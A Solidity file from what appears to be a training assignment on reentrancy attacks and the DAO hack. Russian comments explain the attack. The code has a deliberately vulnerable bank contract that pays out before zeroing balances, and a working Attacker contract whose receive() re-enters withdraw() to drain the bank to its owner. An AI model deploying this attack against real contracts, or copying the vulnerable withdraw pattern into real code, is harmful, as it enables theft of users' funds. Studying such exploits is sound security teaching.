/*
Задача 14
Изучить Reentrancy атаки, DAO Hack.
Кратко комментарием прописать основной смысл атаки и способ ее реализации.
Написать контракты, реализующие эту уязвимость.
*/

// мы отправляем допустимое любое количество эфира, которое будет меньше или равное балансу контракта жертвы
// и сразу же вызываем функцию вывода, функция receive() вызывается на контракте атакующего
// а в функции receive() вызывается снова функция вывода средств withdraw(), тем самым происходит рекурсивный вывод
// средства будут выводится пока они есть, дальнейшие строки функции вывода withdraw() выполнятся не будут
// т.к постоянно вызывается отправка средств от запросов receive()
// контроль баланса контракта жертвы осуществляется в функции receive() в контракте атакующего


// bank contract
// https://ropsten.etherscan.io/address/0xf55225a9a82942718AD82e0fA1e322D7A255a5A0#code

// attack contract
// https://ropsten.etherscan.io/address/0x5ed9a55b4d0046850f5b9fb6e778e85b237164f0#code

pragma solidity ^0.8.13;

interface InterfaceBank {
    function deposit() external payable;
    function withdraw() external;
}

contract MyBank {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "not available for withdrawal");
        
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}   

contract Attacker {
    InterfaceBank public targetBank;
    address private owner;

    constructor(address etherBankAddress) {
        targetBank = InterfaceBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        targetBank.deposit{value: msg.value}();
        targetBank.withdraw();
    }

    receive() external payable {
        if (address(targetBank).balance > 0) {
            targetBank.withdraw(); 
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Atata");
        _;
    } 
}